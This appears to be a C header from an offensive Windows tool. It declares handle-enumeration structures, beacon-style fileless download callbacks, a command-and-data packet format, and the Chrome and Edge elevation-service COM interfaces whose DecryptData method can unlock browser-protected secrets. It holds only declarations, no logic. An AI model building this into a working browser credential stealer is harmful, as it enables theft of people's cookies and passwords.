#include <windows.h>

#define SystemHandleInformation 0x10
#define HANDLE_TYPE_FILE 37
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

//nanodump fileless download
#define CALLBACK_FILE       0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09
// chunk size used in download_file: 900 KiB
#define CHUNK_SIZE 0xe1000


typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, SYSTEM_HANDLE_INFORMATION_, * PSYSTEM_HANDLE_INFORMATION_;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    HANDLE UniqueProcessId;
    HANDLE HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct __PUBLIC_OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING TypeName;
    ULONG Reserved [22];    // reserved for internal use
} PUBLIC_OBJECT_TYPE_INFORMATION, *PPUBLIC_OBJECT_TYPE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation,
    SystemHandleInformationEx = 64 // This may differ based on Windows version
} SYSTEM_INFORMATION_CLASS;

typedef enum _OBJECT_INFORMATION_CLASS
{
	ObjectBasicInformation,
	ObjectNameInformation,
	ObjectTypeInformation,
	ObjectAllInformation,
	ObjectDataInformation
} OBJECT_INFORMATION_CLASS, *POBJECT_INFORMATION_CLASS;

typedef struct _OBJECT_NAME_INFORMATION
{
    UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;

typedef struct __PACKET_HEADER {
    DWORD magic;
    DWORD type;
    CHAR buffer[256];
    DWORD dwSize;
} PACKET_HEADER;

enum PacketType {
    PACKET_DATA = 1,
    PACKET_FILE = 2,
    PACKET_CMD = 4
};

// https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824
const CLSID Chrome_CLSID_Elevator = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
const IID Chrome_IID_IElevator    = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };
const CLSID Edge_CLSID_Elevator   = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
const IID Edge_IID_IElevator      = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };

typedef enum {
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3
} ProtectionLevel;

// oleview used to extract structures
// note how edge required 3 additional functions in the structure

typedef struct IElevatorEdge IElevatorEdge;

typedef struct IElevatorEdgeVtbl
    {
        
        HRESULT ( STDMETHODCALLTYPE *QueryInterface )( 
            IElevatorEdge * This,
            /* [in] */ REFIID riid,
            /* [annotation][iid_is][out] */ 
            _COM_Outptr_  void **ppvObject);
        
        ULONG ( STDMETHODCALLTYPE *AddRef )( 
            IElevatorEdge * This);
        
        ULONG ( STDMETHODCALLTYPE *Release )( 
            IElevatorEdge * This);

        HRESULT ( STDMETHODCALLTYPE *ReservedFunction1 )( 
            IElevatorEdge * This);
        
        HRESULT ( STDMETHODCALLTYPE *LaunchUpdateCmdElevated )( 
            IElevatorEdge * This,
            /* [in] */ LPWSTR browser_appid, 
            /* [in] */ LPWSTR cmd_id, 
            /* [in] */ unsigned long caller_proc_id, 
            /* [out] */ ULONG_PTR* proc_handle);

        HRESULT ( STDMETHODCALLTYPE *LaunchUpdateCmdElevatedAndWait )( 
            IElevatorEdge * This,
            /* [in] */ LPWSTR browser_appid, 
            /* [in] */ LPWSTR cmd_id, 
            /* [in] */ unsigned long wait_timeout, 
            /* [out] */ unsigned long* exit_code);

        HRESULT ( STDMETHODCALLTYPE *RunRecoveryCRXElevated )( 
            IElevatorEdge * This,
            /* [string][in] */ WCHAR *crx_path,
            /* [string][in] */ WCHAR *browser_appid,
            /* [string][in] */ WCHAR *browser_version,
            /* [string][in] */ WCHAR *session_id,
            /* [in] */ unsigned long caller_proc_id,
            /* [out] */ ULONG_PTR *proc_handle);
        
        HRESULT ( STDMETHODCALLTYPE *EncryptData )( 
            IElevatorEdge * This,
            /* [in] */ ProtectionLevel protection_level,
            /* [in] */  BSTR plaintext,
            /* [out] */ BSTR *ciphertext,
            /* [out] */ unsigned long *last_error);
        
        HRESULT ( STDMETHODCALLTYPE *DecryptData )( 
            IElevatorEdge * This,
            /* [in] */  BSTR ciphertext,
            /* [out] */ BSTR *plaintext,
            /* [out] */ unsigned long *last_error);
        
        HRESULT ( STDMETHODCALLTYPE *InstallVPNServices )( 
            IElevatorEdge * This);
        
    } IElevatorEdgeVtbl;
 
    struct IElevatorEdge
    {
        struct IElevatorEdgeVtbl *lpVtbl;
    };

typedef struct IElevatorChrome IElevatorChrome;

typedef struct IElevatorChromeVtbl
    {
        
        HRESULT ( STDMETHODCALLTYPE *QueryInterface )( 
            IElevatorChrome * This,
            /* [in] */ REFIID riid,
            /* [annotation][iid_is][out] */ 
            _COM_Outptr_  void **ppvObject);
        
        ULONG ( STDMETHODCALLTYPE *AddRef )( 
            IElevatorChrome * This);
        
        ULONG ( STDMETHODCALLTYPE *Release )( 
            IElevatorChrome * This);

        HRESULT ( STDMETHODCALLTYPE *RunRecoveryCRXElevated )( 
            IElevatorChrome * This,
            /* [string][in] */ WCHAR *crx_path,
            /* [string][in] */ WCHAR *browser_appid,
            /* [string][in] */ WCHAR *browser_version,
            /* [string][in] */ WCHAR *session_id,
            /* [in] */ unsigned long caller_proc_id,
            /* [out] */ ULONG_PTR *proc_handle);
        
        HRESULT ( STDMETHODCALLTYPE *EncryptData )( 
            IElevatorChrome * This,
            /* [in] */ ProtectionLevel protection_level,
            /* [in] */  BSTR plaintext,
            /* [out] */ BSTR *ciphertext,
            /* [out] */ unsigned long *last_error);
        
        HRESULT ( STDMETHODCALLTYPE *DecryptData )( 
            IElevatorChrome * This,
            /* [in] */  BSTR ciphertext,
            /* [out] */ BSTR *plaintext,
            /* [out] */ unsigned long *last_error);
        
        HRESULT ( STDMETHODCALLTYPE *InstallVPNServices )( 
            IElevatorChrome * This);
        
    } IElevatorChromeVtbl;
 
    struct IElevatorChrome
    {
        struct IElevatorChromeVtbl *lpVtbl;
    };